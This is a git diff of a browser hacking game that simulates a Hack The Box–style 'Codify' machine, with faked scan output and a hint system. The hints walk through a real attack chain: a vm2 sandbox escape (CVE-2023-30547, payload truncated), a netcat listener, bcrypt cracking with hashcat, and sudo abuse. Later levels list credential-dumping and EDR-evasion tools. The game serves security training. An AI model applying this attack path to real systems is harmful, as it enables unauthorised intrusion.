+    ║      │ LOCKED   │          ║
+    ║      │▓▓▓▓▓▓▓▓▓▓│          ║
+    ║      └──────────┘          ║
+    ╚═════════════════════════════╝
+`,
+  matrix: `
+    ╔══════════════════════════════════════╗
+    ║  01001000 01000001 01000011 01001011 ║
+    ║  ░▒▓█▓▒░ THE MATRIX HAS YOU ░▒▓█▓▒░ ║
+    ║  Follow the white rabbit...          ║
+    ╚══════════════════════════════════════╝
+`,
+  pwned: `
+     ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
+     ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
+     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
+     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
+     ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
+     ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝
 `
 };
+
+// ============================================
+// COOL ANIMATIONS
+// ============================================
+async function matrixRain(duration = 3000) {
+  const chars = '01アイウエオカキクケコサシスセソタチツテト';
+  const columns = 50;
+  const lines = [];
+
+  for (let i = 0; i < 8; i++) {
+    let line = '';
+    for (let j = 0; j < columns; j++) {
+      line += chars[Math.floor(Math.random() * chars.length)];
+    }
+    lines.push(line);
+  }
+
+  const container = document.createElement('div');
+  container.className = 'output-line ascii';
+  container.style.color = '#00ff00';
+  container.style.textShadow = '0 0 5px #00ff00';
+  output.appendChild(container);
+
+  const start = Date.now();
+  while (Date.now() - start < duration) {
+    let display = '';
+    for (let i = 0; i < lines.length; i++) {
+      // Shift each line
+      lines[i] = chars[Math.floor(Math.random() * chars.length)] + lines[i].slice(0, -1);
+      display += lines[i] + '\n';
+    }
+    container.textContent = display;
+    output.scrollTop = output.scrollHeight;
+    await sleep(50);
+  }
+  container.remove();
+}
+
+async function glitchText(text, iterations = 5) {
+  const glitchChars = '!@#$%^&*()_+-=[]{}|;:,.<>?░▒▓█';
+  const line = document.createElement('div');
+  line.className = 'output-line highlight';
+  output.appendChild(line);
+
+  for (let i = 0; i < iterations; i++) {
+    let glitched = '';
+    for (let j = 0; j < text.length; j++) {
+      if (Math.random() < 0.3) {
+        glitched += glitchChars[Math.floor(Math.random() * glitchChars.length)];
+      } else {
+        glitched += text[j];
+      }
+    }
+    line.textContent = glitched;
+    await sleep(100);
+  }
+  line.textContent = text;
+  return line;
+}
+
+async function typewriterEffect(text, speed = 50, className = '') {
+  const line = document.createElement('div');
+  line.className = 'output-line ' + className;
+  output.appendChild(line);
+
+  for (let i = 0; i <= text.length; i++) {
+    line.textContent = text.substring(0, i) + (i < text.length ? '█' : '');
+    output.scrollTop = output.scrollHeight;
+    if (soundEnabled) playKeyPress();
+    await sleep(speed);
+  }
+  line.textContent = text;
+}
 
 // ============================================
 // LEVEL DEFINITIONS
@@ -743,12 +2739,16 @@ const ASCII = {
 const LEVELS = [
   {
     id: 1,
-    name: "Noob",
-    subtitle: "Script Kiddie Origins",
-    description: "Learn the basics. Scan, enumerate, exploit.",
-    target: "192.168.1.100",
-    objective: "Get user shell on target",
-    commands: ['help', 'nmap', 'gobuster', 'curl', 'nc', 'ssh', 'cat', 'ls', 'id', 'exit'],
+    name: "Foothold",
+    subtitle: "HTB Easy - Codify",
+    description: "A Node.js sandbox escape leads to initial access. Enumerate, find the vulnerability, and escalate.",
+    target: "10.10.11.239",
+    objective: "Obtain root flag",
+    commands: [
+      'help', 'hint', 'status', 'nmap', 'gobuster', 'feroxbuster', 'ffuf', 'curl', 'wget',
+      'nc', 'ssh', 'cat', 'ls', 'id', 'whoami', 'pwd', 'cd', 'find', 'grep', 'sudo',
+      'linpeas', 'pspy', 'strings', 'file', 'python3', 'bash', 'su', 'exit'
+    ],
     init: initLevel1,
     handleCommand: handleLevel1Command
   },
@@ -759,7 +2759,7 @@ const LEVELS = [
     description: "Pivot through the network. Crack hashes. Move laterally.",
     target: "CORP-DC01",
     objective: "Compromise domain user",
-    commands: ['help', 'nmap', 'ssh', 'scp', 'hashcat', 'hydra', 'crackmapexec', 'cat', 'ls', 'exit'],
+    commands: ['help', 'hint', 'status', 'nmap', 'smbclient', 'hashcat', 'crackmapexec', 'evil-winrm', 'cat', 'ls', 'whoami', 'get', 'exit'],
     init: initLevel2,
     handleCommand: handleLevel2Command
   },
@@ -770,7 +2770,7 @@ const LEVELS = [
     description: "Full AD attack chain. Kerberoast. Pass-the-hash. Own the domain.",
     target: "MEGACORP.LOCAL",
     objective: "Domain Admin",
-    commands: ['help', 'bloodhound', 'rubeus', 'mimikatz', 'impacket-secretsdump', 'impacket-psexec', 'evil-winrm', 'cat', 'ls', 'exit'],
+    commands: ['help', 'hint', 'status', 'bloodhound', 'bloodhound-python', 'rubeus', 'mimikatz', 'impacket-secretsdump', 'impacket-psexec', 'net', 'cat', 'ls', 'exit'],
     init: initLevel3,
     handleCommand: handleLevel3Command
   },
@@ -781,7 +2781,7 @@ const LEVELS = [
     description: "Evade endpoint detection. Unhook. Obfuscate. Stay invisible.",
     target: "SECURE-WKS01",
     objective: "Execute payload undetected",
-    commands: ['help', 'scan', 'unhook', 'obfuscate', 'inject', 'hollow', 'execute', 'status', 'exit'],
+    commands: ['help', 'hint', 'scan', 'unhook', 'obfuscate', 'inject', 'hollow', 'execute', 'status', 'tasklist', 'exit'],
     init: initLevel4,
     handleCommand: handleLevel4Command
   },
@@ -792,7 +2792,7 @@ const LEVELS = [
     description: "Analyze the driver. Find the bug. Write the exploit. Own the kernel.",
     target: "vulndrv.sys",
     objective: "SYSTEM via kernel exploit",
-    commands: ['help', 'analyze', 'disasm', 'ioctl', 'alloc', 'write', 'trigger', 'status', 'exit'],
+    commands: ['help', 'hint', 'analyze', 'disasm', 'ioctl', 'alloc', 'write', 'trigger', 'status', '!analyze', 'lm', 'exit'],
     init: initLevel5,
     handleCommand: handleLevel5Command
   },
@@ -803,7 +2803,7 @@ const LEVELS = [
     description: "Write HolyC. Speak to God. Transcend the machine.",
     target: "TempleOS",
     objective: "Divine enlightenment",
-    commands: ['help', 'holyc', 'compile', 'run', 'pray', 'speak', 'transcend', 'exit'],
+    commands: ['help', 'hint', 'status', 'holyc', 'compile', 'run', 'pray', 'speak', 'transcend', 'godsays', 'GodSays', 'exit'],
     init: initLevel6,
     handleCommand: handleLevel6Command
   }
@@ -890,7 +2890,12 @@ function showLevelSelect() {
     `;
 
     if (isUnlocked) {
-      card.onclick = () => startLevel(level.id);
+      card.onclick = () => {
+        // Check if this is the current level with progress
+        const hasProgress = gameState.currentLevel === level.id &&
+                           Object.keys(gameState.levelState).length > 0;
+        startLevel(level.id, hasProgress);
+      };
     }
 
     levelSelect.appendChild(card);
@@ -1023,154 +3028,1373 @@ function completeLevel() {
 }
 
 // ============================================
-// LEVEL 1: NOOB
+// LEVEL 1: FOOTHOLD (HTB Easy - Codify Style)
 // ============================================
 async function initLevel1() {
   gameState.levelState = {
+    // Enumeration phase
     scanned: false,
-    foundAdmin: false,
-    gotCreds: false,
-    connected: false,
-    gotShell: false
+    foundWeb: false,
+    foundEditor: false,
+    // Exploitation phase
+    triedPayloads: 0,
+    gotShell: false,
+    shellUser: '',
+    currentDir: '/home/svc',
+    // Post-exploitation
+    foundTickets: false,
+    foundDb: false,
+    extractedHash: false,
+    crackedPassword: false,
+    foundScript: false,
+    analyzedScript: false,
+    gotRoot: false,
+    // Flags
+    userFlag: false,
+    rootFlag: false
   };
 
-  print(ASCII.server, 'ascii');
   print('');
-  print('┌─────────────────────────────────────────┐', 'info');
-  print('│  TARGET INTEL                           │', 'info');
-  print('├─────────────────────────────────────────┤', 'info');
-  print('│  IP:     192.168.1.100                  │', 'system');
-  print('│  OS:     Linux (Ubuntu 20.04)           │', 'system');
-  print('│  Type:   Web Server                     │', 'system');
-  print('│  Intel:  Misconfigured Apache + SSH    │', 'warning');
-  print('└─────────────────────────────────────────┘', 'info');
+  print('┌────────────────────────────────────────────────────────────────┐', 'info');
+  print('│  MACHINE: Codify                                               │', 'info');
+  print('│  DIFFICULTY: Easy                                              │', 'success');
+  print('├────────────────────────────────────────────────────────────────┤', 'info');
+  print('│  TARGET:    10.10.11.239                                       │', 'system');
+  print('│  OS:        Linux (Ubuntu 22.04)                               │', 'system');
+  print('│  SERVICES:  Unknown - Enumerate!                               │', 'warning');
+  print('├────────────────────────────────────────────────────────────────┤', 'info');
+  print('│  OBJECTIVE: Obtain user.txt and root.txt                       │', 'warning');
+  print('└────────────────────────────────────────────────────────────────┘', 'info');
   print('');
-  await typeText('[BRIEFING] Your first target. A vulnerable web server.', 30, 'info');
-  await typeText('[BRIEFING] Scan it. Find the entry point. Get a shell.', 30, 'info');
-  await typeText('[BRIEFING] Show us what you\'ve got, rookie.', 30, 'warning');
+  await typeText('[BRIEFING] A development server with a code testing service.', 30, 'info');
+  await typeText('[BRIEFING] Find the vulnerability. Escape the sandbox.', 30, 'info');
+  await typeText('[BRIEFING] Enumerate. Escalate. Own the box.', 30, 'warning');
   print('');
+  print('Type "help" for available commands.', 'system');
 }
 
 async function handleLevel1Command(cmd, args) {
   const state = gameState.levelState;
+  const fullCmd = args.length > 0 ? cmd + ' ' + args.join(' ') : cmd;
 
+  // === HELP ===
   if (cmd === 'help') {
-    print('Available commands:', 'info');
-    print('  nmap <target>     - Scan target for open ports', 'system');
-    print('  gobuster <target> - Directory bruteforce', 'system');
-    print('  curl <url>        - Fetch URL content', 'system');
-    print('  nc <target> <port> - Connect to target', 'system');
-    print('  ssh <user>@<target> - SSH connection', 'system');
-    print('  exit              - Return to menu', 'system');
-    return;
-  }
-
-  // Easter egg: whoami
-  if (cmd === 'whoami') {
-    print(`${gameState.hackerName}@n00b-vm`, 'system');
-    addEasterEgg('lvl1_whoami', 'Identity confirmed: Future elite hacker');
-    return;
-  }
-
-  if (cmd === 'nmap') {
-    if (!args[0]) {
-      print('Usage: nmap <target>', 'error');
-      return;
-    }
-    await simulateLoading('Scanning ' + args[0], 2500);
     print('');
-    print('PORT     STATE  SERVICE', 'info');
-    print('22/tcp   open   ssh', 'system');
-    print('80/tcp   open   http', 'system');
-    print('3306/tcp closed mysql', 'system');
-    print('');
-    print('Nmap done: 1 IP address scanned', 'system');
-    state.scanned = true;
+    print('┌────────────────────────────────────────────────────────────────┐', 'info');
+    print('│                    AVAILABLE COMMANDS                          │', 'info');
+    print('├────────────────────────────────────────────────────────────────┤', 'info');
+    print('│  ENUMERATION:                                                  │', 'info');
+    print('│    nmap -sC -sV <ip>       Service/version scan               │', 'system');
+    print('│    nmap -p- <ip>           Full port scan                     │', 'system');
+    print('│    gobuster dir -u <url>   Directory bruteforce               │', 'system');
+    print('│    ffuf -u <url>/FUZZ      Fuzzing with ffuf                  │', 'system');
+    print('│    curl <url>              HTTP requests                      │', 'system');
+    print('│                                                                │', 'info');
+    print('│  EXPLOITATION:                                                 │', 'info');
+    print('│    nc -lvnp <port>         Start listener                     │', 'system');
+    print('│    payload <code>          Send payload to sandbox            │', 'system');
+    print('│                                                                │', 'info');
+    print('│  POST-EXPLOITATION:                                            │', 'info');
+    print('│    ls [-la] [path]         List directory                     │', 'system');
+    print('│    cat <file>              Read file                          │', 'system');
+    print('│    cd <dir>                Change directory                   │', 'system');
+    print('│    find <pattern>          Search for files                   │', 'system');
+    print('│    grep <pattern> <file>   Search in file                     │', 'system');
+    print('│    sudo -l                 Check sudo permissions             │', 'system');
+    print('│    su <user>               Switch user                        │', 'system');
+    print('│    id                      Show current user                  │', 'system');
+    print('│                                                                │', 'info');
+    print('│  TOOLS:                                                        │', 'info');
+    print('│    linpeas                 Run LinPEAS                        │', 'system');
+    print('│    sqlite3 <db>            Query SQLite database              │', 'system');
+    print('│    hashcat -m <mode> <hash> Crack hashes                      │', 'system');
+    print('│    python3 <script>        Run Python script                  │', 'system');
+    print('│                                                                │', 'info');
+    print('│  UTILITY:                                                      │', 'info');
+    print('│    status                  Show progress                      │', 'success');
+    print('│    hint                    Get contextual hint                │', 'warning');
+    print('│    exit                    Return to menu                     │', 'system');
+    print('└────────────────────────────────────────────────────────────────┘', 'info');
     return;
   }
 
-  if (cmd === 'gobuster') {
+  // === STATUS ===
+  if (cmd === 'status') {
+    print('');
+    print('┌────────────────────────────────────────┐', 'info');
+    print('│       LEVEL 1: CODIFY - STATUS         │', 'info');
+    print('├────────────────────────────────────────┤', 'info');
+    print('│  ENUMERATION:                          │', 'muted');
+    print(`│    [${state.scanned ? '✓' : ' '}] Port scan completed         │`, state.scanned ? 'success' : 'system');
+    print(`│    [${state.foundWeb ? '✓' : ' '}] Web application found       │`, state.foundWeb ? 'success' : 'system');
+    print(`│    [${state.foundEditor ? '✓' : ' '}] Code editor discovered     │`, state.foundEditor ? 'success' : 'system');
+    print('│  EXPLOITATION:                         │', 'muted');
+    print(`│    [${state.gotShell ? '✓' : ' '}] Initial foothold            │`, state.gotShell ? 'success' : 'system');
+    print(`│    [${state.userFlag ? '✓' : ' '}] User flag obtained          │`, state.userFlag ? 'success' : 'system');
+    print('│  PRIVILEGE ESCALATION:                 │', 'muted');
+    print(`│    [${state.foundDb ? '✓' : ' '}] Credentials found           │`, state.foundDb ? 'success' : 'system');
+    print(`│    [${state.crackedPassword ? '✓' : ' '}] Password cracked           │`, state.crackedPassword ? 'success' : 'system');
+    print(`│    [${state.gotRoot ? '✓' : ' '}] Root access                 │`, state.gotRoot ? 'success' : 'system');
+    print(`│    [${state.rootFlag ? '✓' : ' '}] Root flag obtained          │`, state.rootFlag ? 'success' : 'system');
+    print('└────────────────────────────────────────┘', 'info');
+    return;
+  }
+
+  // === HINT ===
+  if (cmd === 'hint') {
+    print('');
+    print('💡 HINT:', 'warning');
     if (!state.scanned) {
-      print('Maybe scan the target first?', 'warning');
+      print('Start with enumeration. What services are running?', 'info');
+      print('Try: nmap -sC -sV 10.10.11.239', 'system');
+    } else if (!state.foundEditor) {
+      print('There\'s a web service. Enumerate the subdomains and directories.', 'info');
+      print('Try: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
+    } else if (!state.gotShell) {
+      print('The editor uses vm2 sandbox. Research CVE-2023-30547.', 'info');
+      print('The sandbox can be escaped. Try sending a malicious payload.', 'system');
+      print('Try: payload const {VM} = require("vm2"); ...', 'system');
+    } else if (!state.foundDb) {
+      print('Enumerate the web application directory.', 'info');
+      print('Try: find /var/www -name "*.db" 2>/dev/null', 'system');
+    } else if (!state.crackedPassword) {
+      print('Extract and crack the bcrypt hash from the database.', 'info');
+      print('Try: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
+    } else if (!state.gotRoot) {
+      print('Check what joshua can run with sudo.', 'info');
+      print('There\'s a backup script with a vulnerability...', 'system');
+    } else {
+      print('Read the root flag!', 'success');
+    }
+    print('');
+    return;
+  }
+
+  // === NMAP ===
+  if (cmd === 'nmap') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Nmap 7.94 ( https://nmap.org )', 'info');
+      print('Usage: nmap [Scan Type(s)] [Options] {target specification}', 'system');
+      print('', '');
+      print('TARGET SPECIFICATION:', 'info');
+      print('  Can pass hostnames, IP addresses, networks, etc.', 'system');
+      print('  Ex: scanme.nmap.org, 192.168.0.1; 10.0.0-255.1-254', 'system');
+      print('', '');
+      print('HOST DISCOVERY:', 'info');
+      print('  -sn: Ping Scan - disable port scan', 'system');
+      print('  -Pn: Treat all hosts as online -- skip host discovery', 'system');
+      print('', '');
+      print('SCAN TECHNIQUES:', 'info');
+      print('  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans', 'system');
+      print('  -sU: UDP Scan', 'system');
+      print('  -sN/sF/sX: TCP Null, FIN, and Xmas scans', 'system');
+      print('', '');
+      print('PORT SPECIFICATION:', 'info');
+      print('  -p <port ranges>: Only scan specified ports', 'system');
+      print('    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9', 'system');
+      print('  -p-: Scan all 65535 ports', 'system');
+      print('', '');
+      print('SERVICE/VERSION DETECTION:', 'info');
+      print('  -sV: Probe open ports to determine service/version info', 'success');
+      print('  -sC: equivalent to --script=default', 'success');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  nmap -sV -sC 10.10.11.239     # Service scan with scripts', 'system');
+      print('  nmap -p- 10.10.11.239         # Full port scan', 'system');
+      print('  nmap -sU -p 53,161 10.10.11.239  # UDP scan', 'system');
+      print('', '');
       return;
     }
-    await simulateLoading('Bruteforcing directories', 3000);
+
+    // Validate: must have a target
+    const target = args.find(a => a.match(/^[\d.]+$/));
+    if (!target) {
+      print('ERROR: No target specified.', 'error');
+      print('', '');
+      print('Usage: nmap [Scan Type(s)] [Options] <target>', 'system');
+      print('       nmap --help for full options', 'system');
+      print('', '');
+      print('Example: nmap -sV -sC 10.10.11.239', 'info');
+      return;
+    }
+
+    // Check if target is reachable
+    if (target !== '10.10.11.239') {
+      print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
+      await simulateLoading('Scanning ' + target, 2000);
+      print(`Note: Host ${target} seems down.`, 'warning');
+      print('If it is really up, but blocking our ping probes, try -Pn', 'system');
+      return;
+    }
+
+    const hasVersionScan = args.includes('-sV');
+    const hasScripts = args.includes('-sC');
+    const fullScan = args.includes('-p-');
+    const hasUDP = args.includes('-sU');
+
+    // Must have at least -sV or -sC for meaningful output
+    if (!hasVersionScan && !hasScripts && !fullScan && !hasUDP) {
+      print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
+      await simulateLoading('Scanning ' + target, 1500);
+      print('');
+      print(`Nmap scan report for ${target}`, 'info');
+      print('Host is up (0.045s latency).', 'system');
+      print('Not shown: 997 closed tcp ports (reset)', 'muted');
+      print('', '');
+      print('PORT     STATE SERVICE', 'info');
+      print('22/tcp   open  ssh', 'system');
+      print('80/tcp   open  http', 'system');
+      print('3000/tcp open  ppp', 'system');
+      print('', '');
+      print('[!] Basic scan completed. Use -sV -sC for version detection and scripts.', 'warning');
+      state.scanned = true;
+      autosave();
+      return;
+    }
+
+    await simulateLoading('Scanning ' + target, fullScan ? 4500 : 3000);
     print('');
-    print('/index.html          (Status: 200)', 'system');
-    print('/admin               (Status: 301)', 'success');
-    print('/robots.txt          (Status: 200)', 'system');
-    print('/backup              (Status: 403)', 'warning');
+    print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
+    print(`Nmap scan report for ${target} (codify.htb)`, 'info');
+    print('Host is up (0.045s latency).', 'system');
     print('');
-    print('[!] Found: /admin panel', 'success');
-    state.foundAdmin = true;
+
+    if (fullScan) {
+      print('PORT     STATE SERVICE  VERSION', 'info');
+      print('22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)', 'system');
+      print('| ssh-hostkey:', 'muted');
+      print('|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)', 'muted');
+      print('|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)', 'muted');
+      print('80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))', 'system');
+      print('|_http-title: Codify', 'system');
+      print('|_http-server-header: Apache/2.4.52 (Ubuntu)', 'system');
+      print('3000/tcp open  http     Node.js Express framework', 'success');
+      print('|_http-title: Codify - Online Code Editor', 'success');
+    } else {
+      print('PORT     STATE SERVICE VERSION', 'info');
+      print('22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)', 'system');
+      if (hasScripts) {
+        print('| ssh-hostkey:', 'muted');
+        print('|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)', 'muted');
+      }
+      print('80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))', 'system');
+      print('|_http-title: Codify', 'system');
+      if (hasVersionScan) {
+        print('|_http-server-header: Apache/2.4.52 (Ubuntu)', 'system');
+      }
+      print('3000/tcp open  http    Node.js Express framework', 'success');
+      print('|_http-title: Codify - Online Code Editor', 'success');
+      if (hasScripts) {
+        print('| http-methods:', 'muted');
+        print('|_  Supported Methods: GET HEAD POST OPTIONS', 'muted');
+      }
+    }
+
+    print('', '');
+    print('Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel', 'system');
+    print('', '');
+    print('Service detection performed. Nmap done: 1 IP address (1 host up)', 'muted');
+    print('', '');
+    print('[*] Interesting: Port 3000 running Node.js - likely the code editor', 'warning');
+    print('[*] Add to /etc/hosts: 10.10.11.239 codify.htb', 'info');
+    state.scanned = true;
+    state.foundWeb = true;
     autosave();
     return;
   }
 
-  if (cmd === 'curl') {
-    if (!args[0]) {
-      print('Usage: curl <url>', 'error');
+  // === GOBUSTER ===
+  if (cmd === 'gobuster') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Gobuster v3.6 - Directory/File, DNS, VHost busting tool', 'info');
+      print('', '');
+      print('Usage:', 'warning');
+      print('  gobuster [command]', 'system');
+      print('', '');
+      print('Available Commands:', 'info');
+      print('  dir         Directory/file bruteforcing mode', 'system');
+      print('  dns         DNS subdomain bruteforcing mode', 'system');
+      print('  fuzz        Fuzzing mode', 'system');
+      print('  vhost       Virtual host bruteforcing mode', 'system');
+      print('', '');
+      print('Dir Mode Flags:', 'info');
+      print('  -u, --url string         Target URL (required)', 'success');
+      print('  -w, --wordlist string    Path to wordlist (required)', 'success');
+      print('  -t, --threads int        Number of threads (default 10)', 'system');
+      print('  -x, --extensions string  File extensions to search (.php,.txt)', 'system');
+      print('  -o, --output string      Output file to write results', 'system');
+      print('  -r, --followredirect     Follow redirects', 'system');
+      print('  -k, --insecuressl        Skip SSL cert verification', 'system');
+      print('  -s, --status-codes       Status codes to match (default 200,204,301,302,307,401,403)', 'system');
+      print('  -b, --excludestatuscode  Status codes to exclude', 'system');
+      print('', '');
+      print('Examples:', 'warning');
+      print('  gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
+      print('  gobuster dir -u http://target.htb -w wordlist.txt -x php,html -t 50', 'system');
+      print('  gobuster vhost -u http://target.htb -w subdomains.txt', 'system');
+      print('', '');
       return;
     }
 
-    if (args[0].includes('robots.txt')) {
-      print('User-agent: *', 'system');
-      print('Disallow: /admin', 'system');
-      print('Disallow: /backup/creds.txt', 'success');
-      print('');
-      print('[!] Interesting... /backup/creds.txt', 'warning');
+    if (!state.scanned) {
+      print('Maybe scan the target first?', 'warning');
       return;
     }
 
-    if (args[0].includes('creds.txt') || args[0].includes('backup')) {
-      print('# Backup credentials', 'system');
-      print('# TODO: Remove before production!', 'warning');
-      print('admin:Sup3rS3cur3P@ss!', 'success');
-      print('');
-      print('[!] Got credentials!', 'success');
-      playAlert();
-      state.gotCreds = true;
-      autosave();
+    // Validate required arguments
+    const mode = args[0];
+    if (!mode || !['dir', 'dns', 'vhost', 'fuzz'].includes(mode)) {
+      print('Error: Must use "dir", "dns", "vhost", or "fuzz" subcommand', 'error');
+      print('', '');
+      print('Usage: gobuster dir -u <url> -w <wordlist>', 'system');
+      print('       gobuster --help for full options', 'system');
       return;
     }
 
-    if (args[0].includes('admin')) {
-      print('<html>', 'system');
-      print('  <title>Admin Login</title>', 'system');
-      print('  <form action="/admin/login" method="POST">', 'system');
-      print('    <input name="user" placeholder="Username">', 'system');
-      print('    <input name="pass" type="password">', 'system');
-      print('  </form>', 'system');
-      print('</html>', 'system');
+    const hasUrl = args.includes('-u') || args.includes('--url');
+    const hasWordlist = args.includes('-w') || args.includes('--wordlist');
+
+    if (!hasUrl) {
+      print('Error: the required flag `-u, --url` was not specified', 'error');
+      print('', '');
+      print('Usage: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
       return;
     }
 
-    print('<html><body>Welcome to our server!</body></html>', 'system');
+    if (!hasWordlist) {
+      print('Error: the required flag `-w, --wordlist` was not specified', 'error');
+      print('', '');
+      print('Usage: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
+      return;
+    }
+
+    // Get URL for target validation
+    const urlIdx = args.indexOf('-u') !== -1 ? args.indexOf('-u') : args.indexOf('--url');
+    const url = args[urlIdx + 1] || '';
+
+    if (!url.includes('codify') && !url.includes('10.10.11.239')) {
+      print('Error: Couldn\'t find host specified', 'error');
+      return;
+    }
+
+    const threads = args.includes('-t') ? args[args.indexOf('-t') + 1] : '10';
+    const wordlistIdx = args.indexOf('-w') !== -1 ? args.indexOf('-w') : args.indexOf('--wordlist');
+    const wordlist = args[wordlistIdx + 1] || '/usr/share/wordlists/dirb/common.txt';
+
+    await simulateLoading('Bruteforcing directories', 3500);
+    print('');
+    print('===============================================================', 'info');
+    print('Gobuster v3.6', 'info');
+    print('by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', 'muted');
+    print('===============================================================', 'info');
+    print(`[+] Url:                     ${url}`, 'system');
+    print(`[+] Method:                  GET`, 'system');
+    print(`[+] Threads:                 ${threads}`, 'system');
+    print(`[+] Wordlist:                ${wordlist}`, 'system');
+    print(`[+] Negative Status codes:   404`, 'system');
+    print(`[+] User Agent:              gobuster/3.6`, 'system');
+    print(`[+] Timeout:                 10s`, 'system');
+    print('===============================================================', 'info');
+    print('Starting gobuster in directory enumeration mode', 'info');
+    print('===============================================================', 'info');
+    print('/about               (Status: 200) [Size: 2921]', 'system');
+    print('/editor              (Status: 200) [Size: 3123]', 'success');
+    print('/limitations         (Status: 200) [Size: 2854]', 'system');
+    print('Progress: 4614 / 4615 (99.98%)', 'muted');
+    print('===============================================================', 'info');
+    print('Finished', 'info');
+    print('===============================================================', 'info');
+    print('');
+    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
+    print('[*] Try: curl http://codify.htb:3000/editor', 'info');
+    state.foundEditor = true;
+    autosave();
     return;
   }
 
-  if (cmd === 'ssh') {
+  // === FFUF ===
+  if (cmd === 'ffuf') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Fuzz Faster U Fool - v2.1.0', 'info');
+      print('', '');
+      print('HTTP OPTIONS:', 'warning');
+      print('  -u, --url            Target URL (use FUZZ keyword)', 'success');
+      print('  -w, --wordlist       Wordlist file path', 'success');
+      print('  -X, --method         HTTP method to use (default: GET)', 'system');
+      print('  -d, --data           POST data', 'system');
+      print('  -H, --header         Header "Name: Value" (multiple)', 'system');
+      print('  -b, --cookie         Cookie data "name=value"', 'system');
+      print('', '');
+      print('MATCHING OPTIONS:', 'warning');
+      print('  -mc                  Match HTTP status codes (default: 200,204,301,302,307,401,403,405)', 'system');
+      print('  -ml                  Match amount of lines in response', 'system');
+      print('  -mr                  Match regexp', 'system');
+      print('  -ms                  Match HTTP response size', 'system');
+      print('  -mw                  Match amount of words in response', 'system');
+      print('', '');
+      print('FILTER OPTIONS:', 'warning');
+      print('  -fc                  Filter HTTP status codes', 'system');
+      print('  -fl                  Filter by line count', 'system');
+      print('  -fr                  Filter regexp', 'system');
+      print('  -fs                  Filter HTTP response size', 'system');
+      print('  -fw                  Filter by word count', 'system');
+      print('', '');
+      print('GENERAL OPTIONS:', 'warning');
+      print('  -t, --threads        Number of concurrent threads (default: 40)', 'system');
+      print('  -p                   Seconds of delay between requests', 'system');
+      print('  -o, --output         Output file', 'system');
+      print('  -of                  Output format (json, csv, html)', 'system');
+      print('  -recursion           Scan recursively', 'system');
+      print('  -e                   Extensions (.php,.html,.txt)', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
+      print('  ffuf -u http://target.htb/FUZZ -w wordlist.txt -mc 200 -fc 404', 'system');
+      print('  ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w subdomains.txt', 'system');
+      print('', '');
+      return;
+    }
+
+    if (!state.scanned) {
+      print('Maybe scan the target first?', 'warning');
+      return;
+    }
+
+    // Validate required arguments
+    const hasUrl = args.includes('-u');
+    const hasWordlist = args.includes('-w');
+
+    if (!hasUrl) {
+      print('Error: -u flag required', 'error');
+      print('', '');
+      print('Usage: ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
+      print('       ffuf --help for full options', 'system');
+      return;
+    }
+
+    if (!hasWordlist) {
+      print('Error: -w flag required', 'error');
+      print('', '');
+      print('Usage: ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
+      return;
+    }
+
+    const urlIdx = args.indexOf('-u');
+    const url = args[urlIdx + 1] || '';
+
+    if (!url.includes('FUZZ')) {
+      print('Error: No FUZZ keyword found in URL', 'error');
+      print('', '');
+      print('Example: ffuf -u http://codify.htb/FUZZ -w wordlist.txt', 'system');
+      return;
+    }
+
+    await simulateLoading('Fuzzing', 3000);
+    print('', '');
+    print("        /'___\\  /'___\\           /'___\\", 'info');
+    print("       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/", 'info');
+    print("       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\", 'info');
+    print("        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/", 'info');
+    print("         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\", 'info');
+    print("          \\/_/    \\/_/   \\/___/    \\/_/", 'info');
+    print('', '');
+    print('       v2.1.0', 'muted');
+    print('________________________________________________', 'muted');
+    print('', '');
+    print(' :: Method           : GET', 'system');
+    print(' :: URL              : ' + url, 'system');
+    print(' :: Wordlist         : FUZZ: wordlist.txt', 'system');
+    print(' :: Follow redirects : false', 'system');
